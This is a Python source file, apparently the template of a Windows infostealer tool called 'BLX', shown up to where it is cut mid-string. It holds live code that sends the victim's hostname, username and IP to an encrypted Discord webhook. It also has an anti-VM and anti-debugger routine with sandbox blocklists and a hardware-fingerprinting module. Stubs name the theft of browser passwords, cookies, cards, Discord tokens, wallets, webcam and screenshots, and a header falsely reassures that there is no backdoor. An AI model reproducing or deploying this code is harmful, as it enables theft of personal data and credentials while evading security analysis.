# Copyright (c) BLX (https://blx)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝


Obligatory = r'''
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import subprocess
if sys.platform.startswith("win"):
    _v4r_subprocess_run = subprocess.run
    _v4r_create_no_window = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    def _v4r_run_hidden(*a, **k):
        if k.get("shell"):
            k.setdefault("creationflags", _v4r_create_no_window)
        return _v4r_subprocess_run(*a, **k)
    subprocess.run = _v4r_run_hidden
    _v4r_os_system = os.system
    def _v4r_system_hidden(cmd):
        try:
            subprocess.run(cmd, shell=True, creationflags=_v4r_create_no_window)
        except Exception:
            try: _v4r_os_system(cmd)
            except Exception: pass
    os.system = _v4r_system_hidden

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_M3ss4g3P0pup(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
%WEBHOOK_URL%
"""

v4r_k3y            = "%KEY%"
v4r_website        = "%LINK_WEBSITE%"
v4r_color_embed    = 0xa80505
v4r_username_embed = "BLX | benzoXdev"
v4r_avatar_embed   = "https://zupimages.net/up/26/05/ip7u.png"
v4r_footer_text    = "BLX | benzoXdev - %LINK_GITHUB%"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

try:
    v4r_ping_embed = {"title": "BLX Started", "description": f"PC: {v4r_hostname_pc} | User: {v4r_username_pc} | IP: {v4r_ip_address_public}", "color": v4r_color_embed, "footer": {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}}
    requests.post(v4r_w3bh00k_ur1, json={"embeds": [v4r_ping_embed], "username": v4r_username_embed, "avatar_url": v4r_avatar_embed}, headers={"Content-Type": "application/json"}, timeout=15)
except Exception: pass

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Ant1VM4ndD3bug = r'''
def D3f_Ant1VM4ndD38ug():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    v4r_b14ck_1i5t_u53rn4m35 = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    v4r_b14ck_1i5t_h05tn4m35 = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    v4r_b14ck_1i5t_hw1d5     = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    v4r_b14ck_1i5t_pr0gr4m   = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                v4r_process_name = str(v4r_proc.info['name']).lower()
                if any(debugger in v4r_process_name for debugger in v4r_b14ck_1i5t_pr0gr4m):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in v4r_b14ck_1i5t_u53rn4m35:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in v4r_b14ck_1i5t_u53rn4m35]:
            return True
    except: pass

    try:
        if socket.gethostname() in v4r_b14ck_1i5t_h05tn4m35:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in v4r_b14ck_1i5t_h05tn4m35]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in v4r_b14ck_1i5t_hw1d5:
            return True
    except: pass

    return False

try: v4r_d3t3ct = D3f_Ant1VM4ndD38ug()
except: v4r_d3t3ct = False

if v4r_d3t3ct == True:
    import sys
    sys.exit()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sy5t3mInf0 = r'''
def D3f_Sy5t3mInf0(v4r_zip_file):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: v4r_sy5t3m_1nf0 = platform.system()
    except: v4r_sy5t3m_1nf0 = "None"

    try: v4r_sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: v4r_sy5t3m_v3r5i0n_1nf0 = "None"

    try: v4r_m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: v4r_m4c_4ddr355 = "None"

    try: v4r_r4m_1nf0 = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: v4r_r4m_1nf0 = "None"

    try: v4r_cpu_1nf0 = platform.processor()
    except: v4r_cpu_1nf0 = "None"

    try: v4r_cpu_c0r3_1nf0 = str(psutil.cpu_count(logical=False)) + " Core"
    except: v4r_cpu_c0r3_1nf0 = "None"

    try: v4r_gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: v4r_gpu_1nf0 = "None"

    v4r_path_Cryptography                 = r"SOFTWARE\Microsoft\Cryptography"
    v4r_path_SQMClient                    = r"SOFTWARE\Microsoft\SQMClient"
    v4r_path_HardwareProfiles             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    v4r_path_Nvidia                       = r'SOFTWARE\NVIDIA Corporation'
    v4r_path_HardwareConfig               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Cryptography, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            v4r_Machine_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            v4r_Guid_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Guid_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            v4r_Hw_Profile_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Hw_Profile_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_SQMClient, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            v4r_Machine_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Nvidia+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            v4r_Nvidia_System_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Nvidia_System_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            v4r_Motherboard_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            v4r_Motherboard_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            v4r_Bios_Release_Date = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Release_Date = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            v4r_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            v4r_System_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            v4r_System_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            v4r_System_Family_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Family_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            v4r_System_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            v4r_System_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            v4r_System_SKU_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_SKU_Serial_Number = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: v4r_Uuid_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: v4r_Uuid_Serial_Number = None

    try: v4r_Bios_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: v4r_Bios_Serial_Number = None

    try: v4r_Motherboard_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: v4r_Motherboard_Serial_Number = None

    try: v4r_Processor_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: v4r_Processor_Serial_Number = None

    try: v4r_OemString_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: v4r_OemString_Serial_Number = None

    try: v4r_Asset_Tag = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: v4r_Asset_Tag = None
        
    try:
        v4r_drives_info = []
        v4r_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if v4r_bitmask & 1:
                v4r_drive_path = v4r_letter + ":\\"
                try:
                    v4r_free_bytes = ctypes.c_ulonglong(0)
                    v4r_total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(v4r_drive_path), None, ctypes.pointer(v4r_total_bytes), ctypes.pointer(v4r_free_bytes))
                    v4r_total_space = v4r_total_bytes.value
                    v4r_free_space = v4r_free_bytes.value
                    v4r_used_space = v4r_total_space - v4r_free_space
                    v4r_drive_name = win32api.GetVolumeInformation(v4r_drive_path)[0]
                    drive = {
                        'drive': v4r_drive_path,
                        'total': v4r_total_space,
                        'free': v4r_free_space,
                        'used': v4r_used_space,
                        'name': v4r_drive_name,
                    }
                    v4r_drives_info.append(drive)
                except:
                    ()
            v4r_bitmask >>= 1

        v4r_d15k_5t4t5 = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in v4r_drives_info:
            v4r_use_percent = (v4r_drive['used'] / v4r_drive['total']) * 100
            v4r_free_space_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            v4r_total_space_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            v4r_use_percent_str = "{:.2f}%".format(v4r_use_percent)
            v4r_d15k_5t4t5 += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   v4r_free_space_gb,
                                                                   v4r_total_space_gb,
                                                                   v4r_use_percent_str,
                                                                   v4r_drive['name'])
    except:
        v4r_d15k_5t4t5 = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            v4r_p14tf0rm_1nf0 = 'Pc Portable'
        else:
            v4r_p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        v4r_p14tf0rm_1nf0 = "None"

    try: v4r_scr33n_number = len(screeninfo.get_monitors())
    except: v4r_scr33n_number = "None"

    v4r_status_system_info = "Yes"
    v4r_file_system_info = f"""
User Pc:
 - Hostname    : {v4r_hostname_pc}
 - Username    : {v4r_username_pc}
 - DisplayName : {v4r_displayname_pc}

System:
 - Plateform     : {v4r_p14tf0rm_1nf0}
 - Exploitation  : {v4r_sy5t3m_1nf0} {v4r_sy5t3m_v3r5i0n_1nf0}
 - Screen Number : {v4r_scr33n_number}

Peripheral:
 - CPU : {v4r_cpu_1nf0}, {v4r_cpu_c0r3_1nf0} 
 - GPU : {v4r_gpu_1nf0}
 - RAM : {v4r_r4m_1nf0}

Disk:
{v4r_d15k_5t4t5}

Serial Number:
 - MAC                       : {v4r_m4c_4ddr355}
